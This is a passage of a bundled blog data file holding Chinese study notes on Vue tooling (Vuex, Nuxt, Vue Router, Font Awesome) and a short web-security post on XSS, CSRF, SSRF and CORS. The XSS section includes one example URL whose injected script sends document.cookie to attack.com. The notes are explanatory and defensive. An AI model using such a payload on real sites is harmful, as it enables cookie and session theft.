<code>Actions</code>\n<code>Actions</code> 不會直接修改 <code>State</code>，而是提交（commit） <code>mutation</code>\n讓對應的 <code>mutation handler</code> 去更改 <code>State</code></li>\n<li>亦可非同步與 Backend API 溝通</li>\n</ol>\n<h4 id=\"mutations\"><code>Mutations</code>:</h4>\n<ol>\n<li>從 <code>commit</code> 接收 <code>Actions</code> 傳遞的資料與行為，透過計算處理後更改 <code>State</code></li>\n<li>每個 <code>Mutation</code> 都有一個字串型態的 <code>type</code>（事件類型）和 <code>handler</code>（回調函數）。</li>\n<li><code>handler</code>（回調函數）是實際更改狀態的地方，首個傳入參數便為 <code>State</code></li>\n<li>只有 <code>commit mutation</code> 才可更改 <code>State</code> 中的狀態，不可直接調用 <code>mutation handler</code></li>\n</ol>\n<h4 id=\"state\"><code>State</code>:</h4>\n<ol>\n<li>使用一個物件型態記錄 App 所有狀態</li>\n<li>由 <code>Mutation</code> 更改狀態</li>\n<li>建議將所有 App 狀態存入 <code>Store</code> 中，但 Vuex 仍可讓組件保有局部狀態</li>\n</ol>\n<h4 id=\"單向資料流-1\">單向資料流</h4>\n<p>所有的動作從 <code>action</code> 出發，將結果存進 store 中，改變 <code>state</code>，\n<code>state</code> 改變後，<code>view</code> 會連同改變，\n而這一連串的行為是 <code>不可逆</code> 的，因此稱為單向資料流。</p>\n<h4 id=\"安裝\">安裝</h4>\n<ol>\n<li>npm: <code>npm instasll vuex --save</code></li>\n<li>CDN: <code>https://unpkg.com/vuex</code></li>\n</ol>\n<h4 id=\"設置\">設置</h4>\n<p><code>main.js</code>:</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">import</span> Vuex <span class=\"token keyword\">from</span> <span class=\"token string\">\"vuex\"</span><span class=\"token punctuation\">;</span>\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>Vuex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/fruitriin/items/42b0ebc5f8a524a0ae17\">vuex をまだ理解していない全人類に捧ぐ vuex を利用したコードの図解 - Qiita</a></li>\n</ul>\n<h3 id=\"nuxt\">Nuxt</h3>\n<ul>\n<li>Vue 2</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://router.vuejs.org/\">Vue-router</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://vuex.vuejs.org/\">Vuex</a></li>\n<li>Vue Server Renderer</li>\n<li>vue-meta</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://masteringnextjs.com/\">Learn Next.js – A free video course on React and Next.js.</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/nishinoshake/items/f42e2f03663b00b5886d\">Nuxt.js を使うときに、SPA・SSR・静的化のどれがいいか迷ったら - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kawaMk4/items/298f95f751540b96d39b\">Nuxt.js でバックもフロントもこれ一本 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/thesugar/items/01896c1faa8241e6b1bc\">大幅にリニューアルされた Next.js のチュートリアルをどこよりも早く全編和訳しました - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/y_kawase/items/fb9f747d88af151f981a\">Web アプリ無料運営のススメ：Firebase と Nuxt(Vue)なら最強！ - Qiita</a></li>\n</ul>\n<h4 id=\"安裝-1\">安裝</h4>\n<pre class=\"language-bash\"><code class=\"language-bash\">npm install --save nuxt\nnpx create-nuxt-app nuxt_app</code></pre><ul>\n<li><code>nux</code>: 同捆於 <code>npm</code> 中能夠快速執行 <code>npm</code> package 的指令</li>\n</ul>\n<h3 id=\"vue-router\">Vue Router</h3>\n<ul>\n<li><code>vue-router</code> 提供能在前端模擬路由的功能，在切換頁面時就不需要向後端發出請求</li>\n</ul>\n<h4 id=\"安裝-2\">安裝</h4>\n<ol>\n<li>於 <code>vue-cli</code> 建置專案時選用 Vue Router</li>\n<li><code>vue add router</code></li>\n<li><code>npm i vue-router</code>\n└ 接著在 <code>router.js</code> 中啟用 <code>Vue.use(VueRouter)</code></li>\n</ol>\n<h4 id=\"路由配置\">路由配置</h4>\n<ol>\n<li>進入點與路由頁面可以在 <code>router.js</code> 中設定</li>\n<li><code>&lt;router-view&gt;&lt;/router-view&gt;</code>：顯示路由組件\n└ <code>&lt;router-view name=&quot;name&quot;&gt;&lt;/router-view&gt;</code></li>\n<li><code>&lt;router-link&gt;&lt;/router-link&gt;</code>：配置路由連結\n└ <code>&lt;router-link to=&quot;path&quot;&gt;Link&lt;/router-link&gt;</code></li>\n</ol>\n<ul>\n<li><code>vue-router</code> 有三種路由模式\n├ hash 模式（預設）\n├ history 模式\n├ abstract 模式\n└ 可以從管理路由的 <code>router.js</code> 中指定</li>\n</ul>\n<p><code>router.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> 組件 <span class=\"token keyword\">from</span> <span class=\"token string\">'@/components/組件'</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">VueRouter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  mode<span class=\"token operator\">:</span> <span class=\"token string\">'history'</span><span class=\"token punctuation\">,</span>\n  routes<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n      name<span class=\"token operator\">:</span> <span class=\"token string\">'組件名稱'</span><span class=\"token punctuation\">,</span>\n      path<span class=\"token operator\">:</span> <span class=\"token string\">'路徑位置'</span><span class=\"token punctuation\">,</span>\n      component<span class=\"token operator\">:</span> <span class=\"token keyword\">import</span> 的組件\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre><p><code>App.vue</code></p>\n<pre class=\"language-vue\"><code class=\"language-vue\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> 組件 <span class=\"token keyword\">from</span> <span class=\"token string\">'@/components/組件'</span>\n\n  <span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token punctuation\">{</span>\n    components<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      組件\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>template</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>nav</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>router-link</span> <span class=\"token attr-name\">to</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/組件<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Link<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>router-link</span><span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>nav</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>router-view</span><span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>template</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"取得路由參數\">取得路由參數</h4>\n<ol>\n<li>params：取得於路由設置中自訂的參數</li>\n</ol>\n<p><code>router.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// 冒帽後方字串為自訂參數名稱</span>\n  <span class=\"token comment\">// 問號代表此參數可為空</span>\n  path<span class=\"token operator\">:</span> <span class=\"token string\">'/Products/:id?'</span><span class=\"token punctuation\">,</span>\n  component<span class=\"token operator\">:</span> Products\n<span class=\"token punctuation\">}</span></code></pre><ul>\n<li>於網址傳入參數後：<code>http://localhost:8080/#/Products/1</code></li>\n<li>可於 Vue 中取得參數：<code>this.$route.params.id</code></li>\n</ul>\n<ol start=\"2\">\n<li>query：取得於網址問號之後的字串</li>\n</ol>\n<p><code>router.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// 無需特定設置</span>\n  path<span class=\"token operator\">:</span> <span class=\"token string\">'/Products'</span><span class=\"token punctuation\">,</span>\n  component<span class=\"token operator\">:</span> Products\n<span class=\"token punctuation\">}</span></code></pre><ul>\n<li><p>於網址傳入參數後：<code>http://localhost:8080/#/Products?id=1&amp;page=2</code></p>\n</li>\n<li><p>可於 Vue 中取得整個字串：<code>this.$route.query</code></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@linwei5316/vue-router-4c2aad1cc352\">Vue Router. 路由基礎 | by Leo Lin | Medium</a></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/articles/10214449\">Router 基本入門 Day 9 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n</li>\n</ul>\n<h3 id=\"electron-vue\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/SimulatedGREG/electron-vue\">electron-vue</a></h3>\n<ul>\n<li>UI 框架</li>\n<li><code>v-app</code>、<code>v-content</code>、<code>v-container</code></li>\n<li><code>v-layout</code>、<code>v-flex</code>、<code>v-btn</code></li>\n<li><code>v-app-bar</code>、<code>v-app-bar-nav-icon</code>、<code>v-toolbar-title</code>、<code>v-menu</code>、<code>v-list</code>、<code>v-list-item</code></li>\n<li><code>v-footer</code></li>\n<li><code>v-breadcrumbs</code>、<code>v-carousel</code>、<code>v-card</code>、<code>v-expansion-panels</code>、<code>v-calendar</code></li>\n</ul>\n<h3 id=\"vuepress\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://vuepress.vuejs.org/zh/guide/#features\">VuePress</a></h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.cntlog.net/archives/3778\">ドキュメントサイトのテンプレート VuePress がよかった – Cntlog</a></li>\n</ul>\n<h3 id=\"carvuejs\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://carvuejs.github.io/home\">CarvueJS</a></h3>\n<h3 id=\"vite\">Vite</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/antfu/vitesse\">antfu/vitesse: 🏕 Opinionated Vite Starter Template</a></li>\n</ul>\n<h2 id=\"ui-framework\">UI Framework</h2>\n<h3 id=\"vuetify\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://vuetifyjs.com/\">Vuetify</a></h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/reireias/items/3688ff593185a79d521b\">Vuetify 2.0 の注目機能と Nuxt.js での試し方 - Qiita</a></li>\n</ul>\n<h3 id=\"bootstrap-vue\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://bootstrap-vue.js.org/\">bootstrap-vue</a></h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://titangene.github.io/article/bootstrap-vue-env-import-components.html\">BootstrapVue：環境建置 (引入全部元件/部分元件) | Titangene Blog</a></li>\n</ul>\n<h3 id=\"element-ui\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://element.eleme.io/#/en-US\">element-ui</a></h3>\n<h3 id=\"vue-material\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://vuematerial.io/\">vue-material</a></h3>\n<h2 id=\"library\">Library</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://vue-chartjs.org/\">vue-chartjs</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://cweili.github.io/vue-fa/\">vue-fa</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://baianat.github.io/vee-validate/\">vue-validate</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://eslint.vuejs.org/\">eslint-plugin-vue</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hilongjw/vue-lazyload\">vue-lazyload</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/axios/axios\">axios</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/vuejs/vue-style-loader#readme\">vue-style-loader</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/SortableJS/Vue.Draggable\">vuedraggable</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/MetinSeylan/Vue-Socket.io\">vue-socket.io</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://vue-multiselect.js.org/\">vue-multiselect</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://codesandbox.io/s/mpklq49wp\">vuejs-datepicker</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/anguer/vue-editor\">vue-md-editor</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/cngu/vue-typer\">vue-typer</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://craigh411.github.io/vue-rate-it/\">vue-rate-it</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://xaksis.github.io/vue-good-table/\">vue-good-table</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/willmcpo/body-scroll-lock#readme\">body-scroll-lock</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.growthbunker.dev/vuesocial/\">vuesocial</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/ratiw/vuetable-2\">vuetable-2</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://apexcharts.com/vue-chart-demos/\">vue-apexcharts</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/devstark-com/vue-google-charts\">vue-google-charts</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/brockpetrie/vue-moment\">vue-moment</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://vue-crud.github.io/\">vue-crud</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/alvarotrigo/vue-fullpage.js\">vue-fullpage</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://lusaxweb.github.io/vuesax/\">Vue.js Framework Components - Vuesax</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://themeforest.net/item/vuexy-vuejs-html-laravel-admin-dashboard-template/23328599\">Vuexy - Vuejs, React, HTML &amp; Laravel Admin Dashboard Template by PIXINVENT</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mascii/items/558c7d5d5bf82eaa59a6\">VueUse</a></li>\n</ul>\n<h3 id=\"vue-fontawesome\">vue-fontawesome</h3>\n<h4 id=\"安裝-3\">安裝</h4>\n<ul>\n<li><code>npm i -D @fortawesome/{vue-fontawesome,fontawesome-svg-core,free-brands-svg-icons}</code></li>\n<li>免費圖示：\n├ <code>@fortawesome/free-solid-svg-icons</code>\n├ <code>@fortawesome/free-regular-svg-icons</code>\n└ <code>@fortawesome/free-brands-svg-icons</code></li>\n<li>付費圖示：\n├ <code>@fortawesome/pro-solid-svg-icons</code>\n├ <code>@fortawesome/pro-regular-svg-icons</code>\n├ <code>@fortawesome/pro-light-svg-icons</code>\n└ <code>@fortawesome/pro-duotone-svg-icons</code></li>\n</ul>\n<h4 id=\"設定付費資訊\">設定付費資訊</h4>\n<pre class=\"language-bash\"><code class=\"language-bash\"># A. 全體設定\nnpm config set \"@fortawesome:registry\" https://npm.fontawesome.com/ &amp;&amp; \\\nnpm config set \"//npm.fontawesome.com/:_authToken\" TOKEN\n\n# B. 在 project 主資料夾或與 package.json 相同位置的資料夾裡建立 .npmrc 檔案設定\n@fortawesome:registry=https://npm.fontawesome.com/\n//npm.fontawesome.com/:_authToken=TOKEN</code></pre><h4 id=\"導入-1\">導入</h4>\n<p><code>main.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> library <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/fontawesome-svg-core\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 圖示名稱至 fontawesome 網站 https://fontawesome.com/icons?d=gallery 上搜尋</span>\n<span class=\"token comment\">// 依欲使用的風格選擇</span>\n<span class=\"token comment\">// free-solid-svg-icons 為填滿圖示，通常以 fas 為標頭</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> 欲使用的圖示名稱 <span class=\"token keyword\">as</span> 圖示變數 <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-solid-svg-icons\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> faStar <span class=\"token keyword\">as</span> fasStar <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-solid-svg-icons\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// free-regular-svg-icons 為一般圖示，通常以 far 為標頭</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> 欲使用的圖示名稱 <span class=\"token keyword\">as</span> 圖示變數 <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-regular-svg-icons\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> faStar <span class=\"token keyword\">as</span> farStar <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-regular-svg-icons\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> FontAwesomeIcon <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/vue-fontawesome\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 加入至 project 中</span>\nlibrary<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>欲使用的圖示名稱<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"font-awesome-icon\"</span><span class=\"token punctuation\">,</span> FontAwesomeIcon<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"使用\">使用</h4>\n<p>組件的名稱於上方的 <code>Vue.component</code> 裡設定，如文內的範例是 <code>font-awesome-icon</code>；在欲使用的頁面裡加入：\n<code>&lt;font-awesome-icon :icon=&quot;[&#39;圖示標頭&#39;, &#39;圖示名稱&#39;]&quot; /&gt;</code>\nex: <code>&lt;font-awesome-icon :icon=&quot;[&#39;fab&#39;, &#39;font-awesome&#39;]&quot; /&gt;</code></p>\n","date":"2019-12-07T06:42:15.000Z","excerpt":"","printDate":"December 7, 2019","printReadingTime":"23 min read"};

var route_80 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod77
});

var Mod78 = {"title":"網頁安全","slug":"web-security","html":"<h2 id=\"xss\">XSS</h2>\n<ul>\n<li>Cross-site scripting</li>\n<li>利用動態產生內容的網頁漏洞，注入惡意腳本的攻擊手法</li>\n<li>例如使用短網址包覆帶有惡意腳本的網址：\n<code>http://app.com/?name=?&lt;script&gt;...attack.com/bad.php?data=document.cookie;&lt;/script&gt;</code></li>\n<li>攻擊者便可取得使用者的 Cookie，並藉此盜用相關資料</li>\n<li>可以針對特殊文字進行處理 (例如 <code>&lt;</code>、<code>&amp;</code>) 防止攻擊。</li>\n</ul>\n<h2 id=\"csrf\">CSRF</h2>\n<ul>\n<li>Cross-site request forgery（跨站請求偽造）</li>\n<li>利用網頁應用本身的漏洞，進行原定以外處理的攻擊手法</li>\n<li>例如使用短網指包覆指定行為的網址：<code>http://app.com/post/</code></li>\n<li>導致使用者身份被盜用，從而進行非原定的行為，例如留下犯罪宣言的訊息</li>\n<li>可以在 request 裡加入 token 驗證這個行為是否真的來自該使用者</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mpyw/items/0595f07736cfa5b1f50c\">これで完璧！今さら振り返る CSRF 対策と同一オリジンポリシーの基礎</a></li>\n</ul>\n<h2 id=\"xss-和-csrf-的差異\">XSS 和 CSRF 的差異</h2>\n<table>\n<thead>\n<tr>\n<th>觀點</th>\n<th>XSS</th>\n<th>CSRF</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>漏洞</td>\n<td>網頁應用程式</td>\n<td>網頁應用程式</td>\n</tr>\n<tr>\n<td>執行機制</td>\n<td>造訪有問題的網址</td>\n<td>造訪有問題的網址</td>\n</tr>\n<tr>\n<td>執行源頭</td>\n<td>網頁瀏覽器 (Client)</td>\n<td>網頁伺服器 (Server)</td>\n</tr>\n<tr>\n<td>執行內容</td>\n<td>JavaScript 所能執行的任意內容</td>\n<td>網頁應用程式內所定義的處理</td>\n</tr>\n<tr>\n<td>執行前提</td>\n<td>無</td>\n<td>受害者需先登入網頁應用程式</td>\n</tr>\n</tbody></table>\n<h2 id=\"json-hijacking\">JSON Hijacking</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://adon988.logdown.com/posts/7820118-introduction-to-json-hijacking\">Json Hijacking 簡介 « 關於網路那些事...</a></li>\n</ul>\n<h2 id=\"ssrf\">SSRF</h2>\n<ul>\n<li>Server-side request forgery</li>\n<li>利用公開網路與內部網路溝通的漏洞，進行繞過權限認證的攻擊方式</li>\n</ul>\n<h2 id=\"同源政策（same-origin-policy）\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy\">同源政策（Same-Origin Policy）</a></h2>\n<h3 id=\"什麼是-cors（cross-origin-resource-sharing，跨來源資源共用）？\">什麼是 CORS（Cross-Origin Resource Sharing，跨來源資源共用）？</h3>\n<h3 id=\"解決方案\">解決方案</h3>\n<h4 id=\"從-api-後端開放權限\">從 API 後端開放權限</h4>\n<h4 id=\"cors-anywhere\">CORS-anywhere</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// use cors-anywhere to fetch api data</span>\n<span class=\"token keyword\">const</span> cors <span class=\"token operator\">=</span> <span class=\"token string\">\"https://cors-anywhere.herokuapp.com/\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// origin api url</span>\n<span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://tw.rter.info/capi.php?=1568944322585\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// fetch api url by cors-anywhere</span>\naxios<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>cors<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>url<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span>\n  <span class=\"token punctuation\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> msg <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span>\n    document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"參考文章\">參考文章</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://shubo.io/what-is-cors/\">[教學] CORS 是什麼? 如何設定 CORS? | Shubo’s Notes</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2017/05/20/api-ajax-cors-and-jsonp/\">輕鬆理解 Ajax 與跨來源請求</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2018/08/18/cors-issue/\">原來 CORS 沒有我想像中的簡單</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/d-d-mag/%E5%92%8C-cors-%E8%B7%9F-cookie-%E6%89%93%E4%BA%A4%E9%81%93-dd420ccc7399\">和 CORS 跟 cookie 打交道</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.kalan.dev/abort-controller/\">新的取消請求方式 - AbortController | 半熟前端</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/xixigiggling/my-ice-cream/issues/9\">这波跨域不亏 · Issue #9 · xixigiggling/my-ice-cream</a></li>\n</ul>\n<h2 id=\"相關文章\">相關文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/E-46/items/93199f38bdacd6b6076a\">安全な Web サイトのつくりかた　ざっくりまとめ part1</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/E-46/items/aa43b6a01de8ab205591\">安全な Web サイトのつくりかた　ざっくりまとめ part2</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/uichi/items/c34536b66101e9440cf2\">個人開発でも最低限やっておくべきインフラレベルでのセキュリティ対策</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Tsutou/items/cea87dbab0f3d0080422\">Web セキュリティ覚書 : &quot;HTTPS&quot; 編 [ 初学者向け ]</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Tsutou/items/4fd498f8ab2638bd5650\">Web セキュリティ覚書 : &quot;攻撃&quot; 編 [ 初学者向け ]</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@jaydenlin/same-origin-policy-%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-%E4%B8%80%E5%88%87%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A4%8E-36432565a226\">Same Origin Policy 同源政策 ! 一切安全的基礎</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/wanko5296/items/142b5b82485b0196a2da\">3 分でわかる XSS と CSRF の違い</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://speakerdeck.com/hasegawayosuke/ssrfji-chu\">SSRF 基礎 - Speaker Deck</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://yamory.io/blog/about-ssrf/\">URL の取り扱いには要注意！ SSRF の攻撃と対策 | yamory Blog</a></li>\n</ul>\n","date":"2019-09-02T05:44:11.000Z","excerpt":"","printDate":"September 2, 2019","printReadingTime":"2 min read"};

var route_63 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod78
});

